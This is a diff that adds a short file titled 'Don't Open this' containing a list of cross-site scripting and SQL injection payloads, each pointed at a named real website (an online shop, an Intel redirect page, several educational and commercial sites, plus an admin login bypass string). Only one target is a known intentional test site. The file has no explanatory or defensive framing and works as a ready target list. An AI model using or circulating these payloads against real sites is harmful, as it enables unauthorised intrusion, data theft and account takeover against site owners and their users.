@@ -1,0 +1,15 @@
+Don't Open this
+
+xss
+https://www.techlandbd.com/index.php?route=product%2Fsearch&search=javascript%3A%2F%2A%27-alert%281%29-%27%2A%2F
+https://epp.intel.com/redirect.aspx?url=javascript%3a(alert(%27XSS+hehe!%27))()q
+
+sqli
+
+https://healthacademy.in.th/admin/
+' or 1=1 limit 1 -- -+
+http://www.native.edu.pk/detail.php?ComCatID=32+AND+0+UNION+SELECT+1,2,3,4,5--
+https://christhujyothi.com/gallery.php?id=.2+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11--
+http://testphp.vulnweb.com/artists.php?artist=1+AND+0+UNION+SELECT+1,2,3--
+https://www.megaplanet.co.th/eng/news_detail.php?id=.12'UNION+SELECT+1,2,3,4,5,6,7,8,9--+-
+
